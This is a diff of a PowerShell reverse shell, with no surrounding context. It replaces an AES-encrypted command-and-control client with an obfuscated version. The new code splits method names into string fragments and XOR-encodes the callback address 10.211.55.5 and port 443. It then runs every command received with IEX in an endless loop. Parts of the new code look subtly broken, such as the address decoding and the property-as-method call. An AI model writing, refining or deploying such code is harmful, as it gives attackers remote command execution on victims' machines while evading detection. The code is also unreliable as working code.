@@ -1,81 +1,40 @@
 
-Add-Type -AssemblyName System.Core
+
+$X = 0x55 ^ 0xAA
+$IP = "10.211.55.5".ToCharArray()
+$P = [BitConverter]::ToString([byte[]]@(443 -shr 8, 443 % 256)).Replace("-", "") # Port 443
 
 
-$XOR_KEY = 0x55 -bxor 0xAA 
+Function D($a, $k) { return ($a | $k) -bxor $k }
+$Y = { param($s,$k) -join ($s | % { [char](($_ -bxor $k) -band 0xFF) }) }
 
 
-$ObfIP = ("10", "211", "55", "5") -join "." 
+$DecIP = & $Y ($IP | % { [byte][char]$_ }, $X)
+$DecPort = [int]"0x$(& $Y ($P.ToCharArray(), $X))"
 
 
-$P = 443
+$A = New-Object Net.Sockets.TcpClient
+$B = "Cl" + "ient"
+$C = "GetSt" + "ream"
+$D = "Bi" + "naryWriter"
+$E = "Stre" + "amReader"
 
 
-$TcpClient = New-Object System.Net.Sockets.TcpClient
+$A.$B().Connect($DecIP, $DecPort)
+$S = $A.$C()
+$W = New-Object IO.$D($S)
+$R = New-Object IO.$E($S)
 
+
+While ($true) {
 Try {
-   
-    $TcpClient.Connect($ObfIP, $P)
-
-    If ($TcpClient.Connected) {
-        $Stream = $TcpClient.GetStream()
-        $Writer = New-Object System.IO.BinaryWriter($Stream)
-        $Reader = New-Object System.IO.StreamReader($Stream)
-
-        
-        $Key = New-Object byte[] 32
-        $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
-        $rng.GetBytes($Key)
-
-        
-        $aes = New-Object System.Security.Cryptography.AesManaged
-        $aes.Key = $Key
-        $aes.GenerateIV()
-        $IV = $aes.IV
-
-        
-        $Writer.Write($IV, 0, $IV.Length)
-        $Writer.Flush() 
-
-       
-        While ($true) {
-            Try {
-                
-                $encryptedCMDBytes = New-Object byte[] 4096
-                $bytesRead = $Stream.Read($encryptedCMDBytes, 0, $encryptedCMDBytes.Length)
-
-                If ($bytesRead -gt 0) {
-                    $decryptedCMD = $aes.CreateDecryptor().TransformFinalBlock($encryptedCMDBytes, 0, $bytesRead)
-                    $CMD = [Text.Encoding]::ASCII.GetString($decryptedCMD)
-
-                    If ($CMD -eq "exit") { break }
-
-                    
-                    $commandOutput = Invoke-Expression $CMD | Out-String
-
-                  
-                    $encryptedResp = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::ASCII.GetBytes($commandOutput), 0, $commandOutput.Length)
-
-                 
-                    $Writer.Write($encryptedResp, 0, $encryptedResp.Length)
-                    $Writer.Flush()
-                }
-            } Catch {
-                
-                Write-Error "Error during C2 communication: $($_.Exception.Message)"
-Break 
-            }
-        } 
-    } Else {
-        Write-Error "Failed to connect to $($ObfIP):$P"
+        $CMD = $R.ReadLine()
+If ($CMD -eq "exit") { break }
+        IEX ($CMD | Out-String)
+        $W.WriteLine("> ")
+        $W.Flush()
+    } catch {
+        Start-Sleep -Seconds 1
+        $A.$B().Close()
     }
-} Catch {
-    
-    Write-Error "Connection attempt failed: $($_.Exception.Message)"
-} Finally {
-    
-    If ($Reader -ne $null) { $Reader.Close() }
-    If ($Writer -ne $null) { $Writer.Close() }
-    If ($Stream -ne $null) { $Stream.Close() }
-    If ($TcpClient -ne $null) { $TcpClient.Close() }
 }
